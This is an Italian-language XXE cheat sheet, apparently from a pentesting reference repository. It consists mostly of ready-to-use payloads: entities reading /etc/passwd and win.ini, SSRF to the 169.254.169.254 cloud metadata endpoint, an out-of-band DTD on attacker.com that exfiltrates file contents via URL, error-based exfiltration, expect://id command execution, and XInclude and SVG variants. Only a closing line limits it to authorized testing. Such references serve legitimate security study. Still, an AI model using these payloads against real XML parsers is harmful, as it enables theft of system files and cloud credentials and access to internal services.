# 📄 XXE - XML External Entity Injection — scheda di riferimento

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗  ██╗██╗  ██╗███████╗
  ╚██╗██╔╝╚██╗██╔╝██╔════╝
   ╚███╔╝  ╚███╔╝ █████╗  
   ██╔██╗  ██╔██╗ ██╔══╝  
  ██╔╝ ██╗██╔╝ ██╗███████╗
  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
   Injection di entità XML esterne (XML External Entity Injection)
```

> **Nota di compatibilità:** gli esempi richiedono che il parser elabori le funzionalità XML pertinenti e consenta l’accesso alle risorse indicate. XInclude è una funzionalità distinta che deve essere elaborata dall’applicazione; i wrapper PHP e `expect://` dipendono dai componenti installati. Cambiare la dichiarazione in UTF-16 senza cambiare i byte non converte il documento. Vedi la [guida PortSwigger](https://portswigger.net/web-security/xxe).

---

## 🎯 Che cos'è XXE

Una vulnerabilità **XXE** sfrutta i parser XML che elaborano riferimenti a entità esterne, consentendo la lettura di file, SSRF e, in alcuni casi, esecuzione di codice remoto (RCE).

---

## 💉 Payload di base

### Lettura di file locali
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### File Windows
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

### SSRF tramite XXE
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/">
]>
<root>&xxe;</root>
```

---

## 🔒 XXE blind (fuori banda)

### DTD esterna
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**evil.dtd sul server dell'attaccante:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### Esfiltrazione basata sugli errori
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

---

## 🛡 Tecniche di aggiramento

### Codifica
```xml
<!-- UTF-16 -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- Contenuto codificato in Base64 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### Varianti dei protocolli
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "data://text/plain,test">
```

### XInclude
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### SVG XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>
```

---

## 📊 Riferimento rapido

| Tipo di payload | Caso d'uso |
| -------------- | ---------- |
| Lettura di file | `SYSTEM "file:///etc/passwd"` |
| SSRF | `SYSTEM "http://internal/"` |
| Blind (fuori banda) | DTD esterna ed esfiltrazione |
| Basato sugli errori | Forza un errore contenente i dati |

### Endpoint comunemente vulnerabili
```
- API SOAP
- Caricamento di file XML
- Elaboratori SVG
- Parser di documenti (DOCX, XLSX)
- Feed RSS/Atom
```

---

## 📚 Risorse

- [PortSwigger XXE](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

---

<p align="center">
  <b>📄 Verifica i parser XML!</b><br>
  <i>Solo per test autorizzati!</i>
</p>
